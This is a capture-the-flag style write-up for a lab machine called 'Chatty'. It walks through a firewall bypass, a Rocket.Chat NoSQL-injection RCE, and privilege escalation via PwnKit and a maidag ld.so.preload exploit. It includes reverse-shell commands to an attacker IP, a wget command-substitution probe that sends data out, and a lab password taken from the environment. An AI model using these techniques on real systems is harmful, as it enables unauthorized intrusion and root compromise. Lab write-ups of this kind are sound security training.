# Chatty
### Enumeration
There appears to be a firewall blocking incoming requests, as a standard `nmap` scan is showing that all ports are closed.

My next move was to scan UDP ports, but nothing immediately showed up as open, so whilst I left this scanning, I tried doing another TCP `SYN` scan but specified the source port as `53`, to trick the firewall into thinking the requests are DNS requests, in the hopes that it will permit such requests to pass through the firewall. This works!

```
# Nmap 7.92 scan initiated Sun Apr  3 17:05:50 2022 as: nmap -v -p- -sC -sV -sS -g 53 -oN tcp.out 192.168.51.164
Nmap scan report for 192.168.51.164
Host is up (0.0035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     X-Instance-ID: m46MgKskNShhnKSiN
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sun, 03 Apr 2022 21:06:03 GMT
|     Connection: close
...
```

##### 3000
A rocket.chat server. We register a user with the email `test@example.com`. Now if we visit `http://192.168.51.164:300/api/info`, we see that the version is `3.12.1`. Checking `searchsploit`, we find an unauthenticated NoSQL injection to RCE vulnerability for version 3.12.1! We need a low priv user's email, and the admin user's email, which we can find in `http://192.168.51.164:3000/channel/general` and is `admin@chatty.offsec`.

We modify the script to forego resetting the low priv user's password - since we created the account ourselves, we can just set the password to what the exploit expects manually (which is `P@$$w0rd!1234`).

When we run the script, we get a prompt `CMD:>`. I tried `id`, but got simply `{"success": false}` returned.

### Foothold

Digging into the script a bit more, the exploit takes advantage of RocketChat integrations, which allow creation of incoming and outgoing webhooks. These webhooks can have associated scripts which will be executed when the webhook is triggered.

So I tried typing `ping -c 2 192.168.51.200` into the prompt, making sure to start listening for ICMP requests with `tcpdump` first, and I saw 2 pings. So we have a blind RCE.

I used the old `wget http://192.168.51.200/$(which <CMD>)`, replacing `<CMD>` with both `nc` and `bash` to check for those two programs. Both were there, but neither `bash -i >& ...` nor `nc -e /bin/bash ...` reverse shells worked, so I used the netcat OpenBSD reverse shell on port 3000, in case of the firewall blocking anything.

We can immediately grab the user flag. The output of `env` contains the following interesting lines:

```sh
ADMIN_PASS=VeryStrongPassword2069
```

This doesn't appear to be the `rocketchat` or `root` users' password.

### Privilege Escalation
Linpeas flags sudo as vulnerable to [CVE-2021-4034](https://github.com/berdav/CVE-2021-4034). I git cloned the repository into `/dev/shm`, ran `make` and executed the exploit to get a root shell.

### Privilege Escalation (alternate)
When searching for SUID binaries, we see `/usr/local/sbin/maidag`. Searching for exploits, we find a [privesc vulnerability](https://github.com/bcoles/local-exploits/tree/master/CVE-2019-18862) for versions 2.0 - 3.7 (CVE-2019-18862):

```shell-session
$ maidag --version
maidag (GNU Mailutils) 3.7
Copyright (C) 2007-2019 Free Software Foundation, inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

There are two exploits, one for cron and the other which overwrites `ld.so.preload`. The description of the cron exploit says it won't work on Ubuntu since we don't fully control the written data and cron on Ubuntu will error out on the malformed line that this exploit will write.

By contrast, the comments in the other exploit say that `/etc/ld.so.preload` parsing is very forgiving and so will ignore the malformed line, so that's the one we'll use.

The idea behind the exploit is that we can write arbitrary data to the `ld.so.preload` file. This file has the following permissions:

```
-rw------- 1 root user 73 Dec 24 19:26 /etc/ld.so.preload
```

However, the dynamic loader doesn't get elevated privileges even when executing a SUID binary, so it can't read the file. Therefore, we can't get root to execute the payload we'll write simply by calling a SUID binary. Instead, we need to trigger root to execute something.

The exploit creates a binary at `/var/tmp/sh` that will initially be owned by the user that executes the exploit and will not be SUID. It also creates a library at `/tmp/libmaidag.so`, which when loaded will execute code to change the owner of `/var/tmp/sh` to `root:root` and make it SUID. Then it uses the vulnerability in `maidag` to add `/tmp/libmaidag.so` to `ld.so.preload`.

To trigger root execution, the script tries making a bunch of connections with the SMTP port. However, this port is closed on Chatty, so I changed the script to connect to port 22, because we can see from `ps -eaf --forest | grep root` that root is running the SSH daemon:

```shell-session
rocketchat@chatty:/dev/shm$ ./exploit.ldpreload.sh 
[+] /usr/local/sbin/maidag is set-uid
[*] Compiling...
[*] Writing stub to /tmp/stub ...
[*] Adding /tmp/libmaidag.so to /etc/ld.so.preload...
-rw------- 1 root rocketchat 70 Apr  4 21:27 /etc/ld.so.preload
[*] Wait for your shell to be set-uid root: /var/tmp/sh
[*] Spamming TCP connections to 127.0.0.1:25 ...
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
Invalid SSH identification string.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
Invalid SSH identification string.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
Invalid SSH identification string.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
Invalid SSH identification string.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
Invalid SSH identification string.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
Invalid SSH identification string.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
Invalid SSH identification string.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
Invalid SSH identification string.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
Invalid SSH identification string.
[+] Success:
-rwsr-xr-x 1 root root 16792 Apr  4 21:27 /var/tmp/sh
[*] Cleaning up ...
root@chatty:/dev/shm#
```